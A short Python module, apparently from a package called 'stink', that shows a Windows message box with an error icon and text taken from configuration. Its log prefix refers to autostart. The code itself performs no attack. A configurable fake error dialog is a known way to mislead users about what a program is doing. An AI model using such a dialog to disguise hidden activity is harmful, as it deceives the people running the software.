from ctypes import windll

from stink.helpers.config import MessageConfig


class Message:

    def __init__(self, errors: bool):

        self.__errors = errors

        self.__config = MessageConfig()

    def __create_message_window(self):

        windll.user32.MessageBoxW(0, self.__config.MessageDescription, self.__config.MessageTitle, 0x10)

    def run(self):

        try:

            self.__create_message_window()

        except Exception as e:
            if self.__errors is True: print(f"[Autostart]: {repr(e)}")
